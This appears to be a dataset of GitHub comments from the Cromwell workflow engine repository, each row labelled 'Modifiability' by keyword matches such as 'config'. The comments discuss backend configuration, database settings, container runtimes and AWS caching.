attributes, e.g. for [`zones`](https://github.com/broadinstitute/cromwell/blob/839ea1e456b929d6149430f4d7d3805f8c235d3f/supportedBackends/jes/src/main/scala/cromwell/backend/impl/jes/JesRuntimeAttributes.scala#L127) and [`disks`](https://github.com/broadinstitute/cromwell/blob/839ea1e456b929d6149430f4d7d3805f8c235d3f/supportedBackends/jes/src/main/scala/cromwell/backend/impl/jes/JesRuntimeAttributes.scala#L142).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2640#issuecomment-332307343:648,config,config,648,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2640#issuecomment-332307343,2,['config'],['config']
Modifiability,"Hi @nh13, not from Broad but have you tried turning the [docker-digest lookup off](https://cromwell.readthedocs.io/en/stable/tutorials/Containers/#docker-digests) with the following in your config:. ```; docker.hash-lookup.enabled = false; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5178#issuecomment-541952762:190,config,config,190,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5178#issuecomment-541952762,1,['config'],['config']
Modifiability,"Hi @patmagee - I started poking at this but then just reread your ticket. Have you looked at the enhanced label functionality that was just pushed out in 28? It sounded like that might get you what you want here. . Let me know if not or if you'd still rather use the meta fields, it's easy enough to put in, just wanted to make sure it was worthwhile.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2421#issuecomment-313568784:97,enhance,enhanced,97,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2421#issuecomment-313568784,1,['enhance'],['enhanced']
Modifiability,"Hi @rasmuse - a few thoughts. In terms of the submit time keep in mind things like JVM initialization. Calling individual invocations of a java program like that for what's effectively a blink of an eye operation is never going to be ideal from a performance perspective. If you're submitting to a Cromwell server consider using something like `curl` instead. . On the second part, there are a few things potentially going on here. First is that Cromwell doesn't necessarily immediately start a workflow. It scans every `n` seconds for new workflows to start, which defaults to `20`. In a worst case scenario `21` of your `20` seconds could be due to that, although that seems unlikely. You can make that time window shorter by overriding the `system.new-workflow-poll-rate` configuration setting to something smaller, e.g. `1`. Even then, there's a some overhead in there as ultimately we're trying to optimize for a case that's not running single, extremely short tasks. I just ran the moral equivalent of a hello world workflow locally with that config setting set to 1 second. The workflow was picked up for execution at `11:08:44` and registered as complete at `11:08:51` with exactly half of that time spent with the system running the underlying job (i.e. not in Cromwell) so it might be worth revisiting this w/ a combination of using `curl` and speeding up the workflow polling rate. That said while I'd love you to continue to use Cromwell/WDL, it might not wind up being the best tool for your job. If these workflows are purely for yourself & you don't intend on building them up over time and/or distributing them to others, you might want to check out Snakemake which is more intended to be a direct Makefile replacement.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3477#issuecomment-378636936:775,config,configuration,775,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3477#issuecomment-378636936,2,['config'],"['config', 'configuration']"
Modifiability,"Hi @rhpvorderman-. Thanks for giving this PR a full work out. I don't have a lot of experience running SQLite so for others who might want to follow in your steps your experience is very valuable. A few requests/questions:; - For the other reviewers do you have an itemized list of things this PR would need before it should be merged?; - Based on your testing is anything missing from our Centaur regression test config?; - Do you have the time to submit changes to the PR to polish it up (hopefully mostly docs)?. For the lurkers, I'll try to reply with my comments and hypotheses in a follow-up reply this week. Ex: when/why did we create two databases in Cromwell, and how I think that affects SQLite which only wants \*one\* connection per DB.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-739594650:414,config,config,414,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-739594650,1,['config'],['config']
Modifiability,"Hi @ruchim !. 1. Do you see anything in your logs that indicate db errors?. No. I see that the SGE job completed (`Status change from Running to Done`). 2. What does your db config look like?; ```; database {; db.url = ""jdbc:mysql://.../${CROMWELL_DB}?useSSL=false&rewriteBatchedStatements=true""; db.user = ...; db.password = ...; db.driver = ""com.mysql.jdbc.Driver""; profile = ""slick.jdbc.MySQLProfile$""; }; ```; backed by a MariaDB instance. 3. When you report the REST endpoint shows the workflow as 'Running', what about the executionStatus key in the metadata? Are some jobs marked as 'Running' as well?. The SGE job reported as running as well. I manually query the database, and I see no changes in the `JOB_STORE_ENTRY` table when the SGE job completes and the corresponding entry appears in the Cromwell logs (although not entirely sure I should see something). 4. Do you see this behavior only with large scatters (10K) or do you see it with smaller scatters as well? Or any other type of workflow shape?. I've only observed this behaviour with large scatters AND a file-of-file-names approach. I don't know exactly what combination of WDL features or what threshold of scatter width triggers it .",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3483#issuecomment-445788979:174,config,config,174,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3483#issuecomment-445788979,2,"['config', 'rewrite']","['config', 'rewriteBatchedStatements']"
Modifiability,"Hi @ruchim!. Regarding our current test setup:; We (Brian O., Alex B. and I) are currently using a very minimal test configuration:. Workflow:; GA4GH md5sum from Dockstore; https://dockstore.org/workflows/github.com/briandoconnor/dockstore-workflow-md5sum/dockstore-wdl-workflow-md5sum:1.4.0. Single File:; Source: UChicago Gen3 Data STAGE crai file; DRS URL: dos://dg.4503/2132c569-06e7-474c-8806-93aa116c5d1c; Size: 1.49mb. I just now ran this test configuration from scratch, starting with a new workspace, and it failed like all the others have:. Error:; ```; Task ga4ghMd5.md5:NA:1 failed. The job was stopped before the command finished. PAPI error code 10. The assigned worker has failed to complete the operation	; ```. Log:; ```; 2019/07/16 20:23:02 Starting container setup.; 2019/07/16 20:23:10 Done container setup.; 2019/07/16 20:23:16 Starting localization.; 2019/07/16 20:23:22 Localizing input dos://dg.4503/2132c569-06e7-474c-8806-93aa116c5d1c -> /cromwell_root/topmed-irc-share/genomes/NWD844894.b38.irc.v1.cram.crai; Compiling (synthetic)/ammonite/predef/interpBridge.sc; ```. The name of this workspace is `mbaumann test md5sum 20190716` and I have shared it with you as Owner, in case you would like to investigate. Regarding successful runs in Commons in 2018:; The last reported success that I am aware of was by Moran Cabi ali (then Broad) in mid-2018, when she did demos of obtaining data from UChicago (Windmill) and UCSC (Boardwalk).; I didn't actually run the workflow myself.; There are still some of the demo workspaces from that time available in Terra, which I can access yet don't have permission to share. I don't know if you can access them or not. One such workspace is:; `Team Calcium July 1 Demo - Boardwalk-Windmill_WS`",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5069#issuecomment-511990334:117,config,configuration,117,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5069#issuecomment-511990334,2,['config'],['configuration']
Modifiability,Hi @seandavi - you'll want to use the `concurrent-job-limit` field in your backend config (see the `reference.conf` for more details) which was put in for exactly this reason. It's a crude implement but the local backend was intended more as a debug/noodling around backend and not a full on scheduler.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2365#issuecomment-309215718:83,config,config,83,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2365#issuecomment-309215718,1,['config'],['config']
Modifiability,"Hi @vsoch - apologies in advance if I cause us to wind up talking past each other - I haven't had the time I'd wanted to educate myself about Singularity. That said, by a very large margin the use case for Singularity we've been asked about has been ""My WDL declares a Docker container, but i can't use Docker. Please let me run that container with Singularity (or uDocker) instead"". The relative proportion of that vs. people asking about native Singularity containers is such that it's not worth worrying about the latter until the former is taken care of. Because of that, Singularity can't just be added to the WDL - that's not portable in an appropriate way because then I **must** use Docker even when I don't want to. However there are plenty of cases (largely HPC) where a portable WDL or CWL will specify a container but the user will want to use an alternate tech to run it. So in order to enable that what really needs to happen is for tasks which are specified as using a Docker container, to replace the `docker` command in the appropriate backend (local, Slurm, what have you) with a call to `singularity` instead. Does this make sense?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-416419921:632,portab,portable,632,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-416419921,2,['portab'],['portable']
Modifiability,"Hi @vsoch - here's what I have. A word of warning that I found it in an email thread where a user was saying it didn't work for them, but it came from someone for whom it **did** work so YMMV. I'm going to try to try this out myself later although it'll take me a while before I get time to install `udocker` and such. ```; backend {. # Override the default backend. #default = ""LocalExample"". . # The list of providers. providers {. . # The local provider is included by default in the reference.conf. This is an example. . # Define a new backend provider. Local {. # The actor that runs the backend. In this case, it's the Shared File System (SFS) ConfigBackend. actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory"". . # The backend custom configuration. config {. . # Optional limits on the number of concurrent jobs. #concurrent-job-limit = 5. . # If true submits scripts to the bash background using ""&"". Only usefull for dispatchers that do NOT submit. # the job and then immediately return a scheduled job id. run-in-background = true. . # `temporary-directory` creates the temporary directory for commands. #. # If this value is not set explicitly, the default value creates a unique temporary directory, equivalent to:. # temporary-directory = ""$(mktemp -d \""$PWD\""/tmp.XXXXXX)"". #. # The expression is run from the execution directory for the script. The expression must create the directory. # if it does not exist, and then return the full path to the directory. #. # To create and return a non-random temporary directory, use something like:. # temporary-directory = ""$(mkdir -p /tmp/mydir && echo /tmp/mydir)"". . # `script-epilogue` configures a shell command to run after the execution of every command block. #. # If this value is not set explicitly, the default value is `sync`, equivalent to:. # script-epilogue = ""sync"". #. # To turn off the default `sync` behavior set this value to an empty string:. # script-epilogue = """". . # The list of possibl",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2177#issuecomment-412883595:650,Config,ConfigBackend,650,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2177#issuecomment-412883595,5,"['Config', 'config']","['ConfigBackend', 'ConfigBackendLifecycleActorFactory', 'config', 'configuration']"
Modifiability,"Hi @vsoch - it shouldn't require too much of a deep dive into the scala, we know that it already can be made to work with `udocker` by just changing the configuration like you've done. Let me know if you've not seen the udocker example and I'll track it down for you.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2177#issuecomment-412505720:153,config,configuration,153,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2177#issuecomment-412505720,1,['config'],['configuration']
Modifiability,"Hi @vsoch,. Lot's of good stuff here on first glance. I'll dive deeper over the weekend. For better or worse, depending on pricing, support, reliability, etc. etc. etc. we like to move around our CI. I personally also like being able to test scripts on my laptop as much as possible. To that end, I'm trying to advocate for bash scripts that are then invoked from whatever CI we choose. I haven't RTFM'ed enough of this PR nor CircleCI's manual yet to fully grasp what specific Circle features are being used here. Could a lot of the logic be separated from the `.circleci/config.yml` into a script, or multiple scripts if necessary?. On a related note, based on your expertise I may want to pick your brain to go over our [existing CI scripts](https://github.com/broadinstitute/cromwell/blob/develop/src/ci/bin/test.inc.sh#L38-L39) too as we move to Circle, or perhaps something even ~shinier~ [newer](https://news.ycombinator.com/item?id=17602838). Re your build failing: it wasn't anything in your PR. Based on the logs there was a weird connection issue between Travis and Github returning HTTP 5xx errors during the tests.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4015#issuecomment-413988228:573,config,config,573,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4015#issuecomment-413988228,1,['config'],['config']
Modifiability,"Hi @wleepang !; I've updated a pull-request with two commits from my colleagues @TimurKustov and @SergeySdv . Their contribution includes an addition of `AWS` filesystem support for `fileSystemCheck` option in a `centaur` test cases files and also a refactoring of `CheckFiles`.; Because `AWS` is now supported in fileSystemCheck `centaur`'s option I've added some integration tests which are checking that copying of workflow results, workflow logs and call logs (options `final_workflow_outputs_dir`, `final_workflow_log_dir`, `final_call_logs_dir` from options.json file) is now correct on 3 backends (GCP, AWS and local backend). There are placeholders for paths in these test cases and options used by them, because I didn't came with any better options without creating a public buckets on GCP and AWS.; Hope that you can take a look on this soon!; Thanks in advance, best regards!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5110#issuecomment-527659921:250,refactor,refactoring,250,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5110#issuecomment-527659921,1,['refactor'],['refactoring']
Modifiability,"Hi @wleepang . Yes, you are right. The problem I have is particularly when using a slurm backend, as I don't find an easy way to load environment modules except to actually modify the individual command section of each task definition in my workflow. This is inconvenient because when I'm running the same pipeline on AWS batch, there are no environment modules, so my tasks fail unless I explicitly remove all the `module load <module name>` from the command part of each task. I would like to switch back and forth between cloud and cluster without having to touch the pipeline script (i.e. individual tasks) itself. Put differently, can I specify a runtime attribute called `module` much like the `docker` attribute, and then somehow modify the backend configuration settings to have cromwell load this module? . Did I explain myself better this time?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4997#issuecomment-502902782:756,config,configuration,756,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4997#issuecomment-502902782,1,['config'],['configuration']
Modifiability,Hi Brad. In addition to the `http` entry in the backend filesystems config the `http` filesystem also needs to be defined system-wide. Cromwell's `reference.conf` [defines this already](https://github.com/broadinstitute/cromwell/blob/35_hotfix/core/src/main/resources/reference.conf#L290) so as long as that's being pulled into your configuration and you're not overriding the filesystems you should be set.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4184#issuecomment-426052644:68,config,config,68,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4184#issuecomment-426052644,2,['config'],"['config', 'configuration']"
Modifiability,"Hi Brad. To revert to the external cwltool process you can specify this in your configuration: . ```hocon; cwltool-runner {; class = ""cwl.CwltoolProcess""; }; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4183#issuecomment-426012816:80,config,configuration,80,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4183#issuecomment-426012816,1,['config'],['configuration']
Modifiability,"Hi ChenYong,. I'm closing this issue here on GitHub as Cromwell [30-16f3632 / 30.2](https://github.com/broadinstitute/cromwell/releases/tag/30.2) seems to run fine against a basic MariaDB 5.5.56. I also tried changing the database initialization script to run with-and-without setting `SET GLOBAL sql_mode = 'ANSI_QUOTES';`. If you're still running into problems, can you please create a post over in the [Ask the WDL team](https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team) forum? There please provide as many logs and configuration files as possible (without passwords) so that your issue may be reproduced. ---. To test Cromwell with MariaDB I combined the following files and ran them from an `issues_3346/` directory with `docker-compose up`. - `issues_3346/compose/cromwell/app-config/application.conf`; - `issues_3346/compose/cromwell/Dockerfile`; - `issues_3346/compose/mysql/init/init_user.sql`; - `issues_3346/docker-compose.yml`. The files are in this archive: [issues_3346.tar.gz](https://github.com/broadinstitute/cromwell/files/2190721/issues_3346.tar.gz). Cromwell started and connected to the db. I was able to browse to `http://localhost:80` and submit a workflow.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3346#issuecomment-404688457:540,config,configuration,540,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3346#issuecomment-404688457,2,['config'],"['config', 'configuration']"
Modifiability,"Hi Chetana,. in my case, the problem was the variable""file_format"" that I was passing to cutadapt . `cutadapt -f ${file_format}`. in the json file, one of the input was: `""scMeth.file_format"": ""fastq""`, but cutadapt didn't like it. Therefore I have substituted the initial command above with:. `cutadapt -f fastq`. or I have substitute `File file_format` with `String file_fomat` in the first step of the pipeline. Basically I was passing a file but in reality, was just a string for cutadapt. I don't know if this might help. If you type the error from Cromwell maybe I can help you better. Best; Tommaso",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5066#issuecomment-580619402:45,variab,variable,45,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5066#issuecomment-580619402,1,['variab'],['variable']
Modifiability,"Hi Christina,; Have you tried using any other location than us-central1 in the config, the tutorial seems to fail for me if I use any other location",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6497#issuecomment-922859035:79,config,config,79,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6497#issuecomment-922859035,1,['config'],['config']
Modifiability,"Hi Evan thanks for reporting this. That change in the way `tmpDir` is calculated actually wasn't actually intentional, let me see if I can move things around so your old config value still works. Also `tmpDir` chmoding will be [turned off](https://github.com/broadinstitute/cromwell/pull/3735) in Dockerless environments with Cromwell 33.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3784#issuecomment-397676775:170,config,config,170,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3784#issuecomment-397676775,1,['config'],['config']
Modifiability,"Hi Jeff, . The short answer is I don't know about the overall Cromwell world. . The longer answer is: it's intended for me to get around transient issues involving local filesystems and GridEngine dispatcher. . We'd either run into paths not found when it's a network mount issue; or submitting jobs to a GridEngine queue (e.g., UGER) where the job might get killed after a certain time-period or if it takes up too much resources, . I understand that Cromwell already have retry logic that deals with I/O issues or pre-emptible VMs in the GCP world. I'm not sure how to organize the configs and the code to harmonize these two retry world's, so I'll leave it to you except to state that we do want some kind of ""Retry"" in the GridEngine use case. . Thanks,; Paul",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2176#issuecomment-295900647:584,config,configs,584,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2176#issuecomment-295900647,1,['config'],['configs']
Modifiability,"Hi Kris,. That is great news, and of course I totally agree with the notification approach as things scale up ;) Though the issue might be when you get into millions/billions of operations later on, then there are some things that would need to be tweaked for that. As the number of operations scale up, the logging could then also become a bottleneck, as those are also API requests - besides the ones coming from the Pipeline API - and usually is a positive multiplier greater than 1 of the number of operations, with their own Retry requests. I think you'll agree that it's usually better to be more modular, so that things can easily be tweaked and updated over time - such as the transition to Pluggable Backends, but in this case for the Pipeline API directly. I agree with the capability of having fine-grained informational log events, though Pub/Sub API has certain limitations to be aware of:. https://cloud.google.com/pubsub/quotas#other_limits. Don't get me wrong, I'm still excited to see how version 2.0 of the Pipeline API evolves, but there are some tricky scalability issues that might emerge which could make the Cromwell code unnecessarily complex down the line, if one has to work through too many limitations/edge-cases. Paul",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1665#issuecomment-260279789:1038,evolve,evolves,1038,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1665#issuecomment-260279789,1,['evolve'],['evolves']
Modifiability,"Hi Tom, if you could please share any redacted WDL, inputs or config that would be helpful. Thanks",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3736#issuecomment-395193978:62,config,config,62,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3736#issuecomment-395193978,1,['config'],['config']
Modifiability,"Hi is this implemented in the latest version of cromwell? ; I am getting the following error for files > 5G with the latest version . 2019-10-31 04:31:17,243 cromwell-system-akka.dispatchers.engine-dispatcher-32 WARN - 85d92e7d-3017-4e8d-adac-551ebcd50165-EngineJobExecutionActor-jgi_meta.bbcms:NA:1 [UUID(85d92e7d)]: Failed copying cache results for job BackendJobDescriptorKey_CommandCallNode_jgi_meta.bbcms:-1:1 (EnhancedCromwellIoException: [Attempted 1 time(s)] - S3Exception: The specified copy source is larger than the maximum allowable size for a copy source: 5368709120 (Service: S3, Status Code: 400, Request ID: 1272B7BFF87110E8)), invalidating cache entry.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4828#issuecomment-548974241:416,Enhance,EnhancedCromwellIoException,416,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4828#issuecomment-548974241,1,['Enhance'],['EnhancedCromwellIoException']
Modifiability,"Hi thanks for reporting this issue, could you post your Cromwell configuration ? Specifically the [call caching part of the backend configuration](https://github.com/broadinstitute/cromwell/blob/cea07d69919a609362d2e374888f9ed8c4220564/cromwell.examples.conf#L332) (if any)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3717#issuecomment-393883431:65,config,configuration,65,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3717#issuecomment-393883431,2,['config'],['configuration']
Modifiability,"Hi! A task-level caching control has been introduced recently in the Cromwell 49. That's cool, thanks for the feature!. https://cromwell.readthedocs.io/en/stable/optimizations/VolatileTasks/; The example is using wdl specification 1.0 and it differs from draft-2 when tackling the meta section:. - draft-2 waits for a $string as a metadata value; - 1.0 waits for $meta_value = $string | $number | $boolean | 'null' | $meta_object | $meta_array. https://github.com/openwdl/wdl/blob/master/versions/1.0/SPEC.md#metadata-section; https://github.com/openwdl/wdl/blob/master/versions/draft-2/SPEC.md#metadata-section. Hence, a `volatile: true` is not valid for draft-2, because a boolean is not a string. Is it possible to adapt the meta section for draft-2 specification too? In example: `volatile: ""true""`. The majority of our workflows still stick to the draft-2 and their translation to 1.0 will be painful.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1695#issuecomment-607310823:718,adapt,adapt,718,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1695#issuecomment-607310823,1,['adapt'],['adapt']
Modifiability,"Hi, I see you've indeed created a service account and gotten a json file, but I'm not seeing how you're passing it to Cromwell.; Your configuration uses `application_default` as authentication mode, and you are logged in using your personal gmail it seems.; Did you use this json in any way ?. To use the service account in Cromwell you'd want to either; 1 - Recommended) Change your configuration to use the service account instead of application default; You can see how to do that [here](https://cromwell.readthedocs.io/en/develop/backends/Google/); It is slightly outdated, instead of `pem-file` use `json-file` and the path to your json.; 2) You can keep application default and use [`gcloud auth activate-service-account`](https://cloud.google.com/sdk/gcloud/reference/auth/activate-service-account) to authenticate as the service account on your machine. Also could you print the result of `gcloud auth list` ?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3690#issuecomment-392038451:134,config,configuration,134,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3690#issuecomment-392038451,2,['config'],['configuration']
Modifiability,"Hi, I this is might be a little late, but I am having this issue too when running using Batch. I configured my core environment on my own (without using the CF templates). I have a bucket that is located in `us-west-2` and the instance running Cromwell (v59), and the Job Queue are located in `us-east-2`. When I run a job, I get the same error that @illusional was getting.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4731#issuecomment-927177699:97,config,configured,97,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4731#issuecomment-927177699,1,['config'],['configured']
Modifiability,"Hi, look at the [`database.db` stanza](https://github.com/broadinstitute/cromwell/blob/40a0608a629976aca75ddf7f7adafc0fbe8bb399/cromwell.examples.conf#L800):. You want to set the following:; ```; database.db {; numThreads =20; minThreads = 20; maxThreads =20; minConnections = 20; maxConnections = 20; }; ```. For reference and guidance on these nubmers, [look at the `forConfig` Docs for Slick](http://slick.lightbend.com/doc/3.2.3/api/index.html#slick.jdbc.JdbcBackend$DatabaseFactoryDef@forConfig(path:String,config:com.typesafe.config.Config,driver:java.sql.Driver,classLoader:ClassLoader):JdbcBackend.this.Database).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4777#issuecomment-478074579:512,config,config,512,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4777#issuecomment-478074579,3,"['Config', 'config']","['Config', 'config']"
Modifiability,"Hi,. I came across this a little while ago when writing a local provider, you're able to get around this, if it's the same issue, by adding this to your runtime attributes in your config file. ```; runtime-attributes = """"""; String? docker; String? docker_user; Int? runtime_minutes; Int? cpus; Int? mem; """"""; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5947#issuecomment-713903125:180,config,config,180,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5947#issuecomment-713903125,1,['config'],['config']
Modifiability,"Hi,. In Cromwell 52 we updated the S3 module to perform multithreaded, multipart; copies to improve the size of results that may be cached. There are also; additional improvements that have recently been merged into dev and should; appear in the next release version (or you could build from source). v52+ requires a new AWS configuration. Instructions are in; https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf. On Sat, Oct 24, 2020 at 8:27 PM Luyu <notifications@github.com> wrote:. > Hi,; >; > I got a timeout exception during cache copying on AWS S3. The cache file; > size is 133GB. Given the file size, more time should be allowed for cache; > copying. Is there any config option that can tune this? Thank you in; > advance for any suggestions.; >; > Backend: AWS Batch; > Cromwell version: 51; > Error log:; >; > Failure copying cache results for job; > BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo; > FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed; > out waiting for a response to copy s3://xxxxx/cromwell-execution/Germ; >; > line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136; > /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to; > s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488; >; > 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u; > nmerged.bam); >; > —; > You are receiving this because you are subscribed to this thread.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/5977>, or unsubscribe; > <https://github.com/notifications/unsubscribe-auth/AF2E6EMWLDPLNV7UM35OWWLSMNWFNANCNFSM4S56ELLQ>; > .; >",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-716229310:325,config,configuration,325,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-716229310,2,['config'],"['config', 'configuration']"
Modifiability,"Hi,. The improved multipart copying (api: CreateMultipartUpload) doesn't work for me. The cromwell server always checks the existence of the cached file before the copying finishes. In Cromwell v51 and before, some small files <100GB were able to be successfully cached. However, with Cromwell v53, even a 6GB result file got a problem of caching and has to rerun. Is there any way to prevent the timeout of the actor? . > Hi, In Cromwell 52 we updated the S3 module to perform multithreaded, multipart copies to improve the size of results that may be cached. There are also additional improvements that have recently been merged into dev and should appear in the next release version (or you could build from source) v52+ requires a new AWS configuration. Instructions are in https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf; > […](#); > On Sat, Oct 24, 2020 at 8:27 PM Luyu ***@***.***> wrote: Hi, I got a timeout exception during cache copying on AWS S3. The cache file size is 133GB. Given the file size, more time should be allowed for cache copying. Is there any config option that can tune this? Thank you in advance for any suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure copying cache results for job BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out waiting for a response to copy s3://xxxxx/cromwell-execution/Germ line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136 /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u nmerged.bam) — You are receiving this because",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-725311491:743,config,configuration,743,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-725311491,1,['config'],['configuration']
Modifiability,"Hi,. We're trying to make this work for us. We can not get it to do so. You provide your .wdl and .json files, what is the .conf file you used to get Cromwell config setup correctly?; Thank you",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7205#issuecomment-2161250684:159,config,config,159,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7205#issuecomment-2161250684,1,['config'],['config']
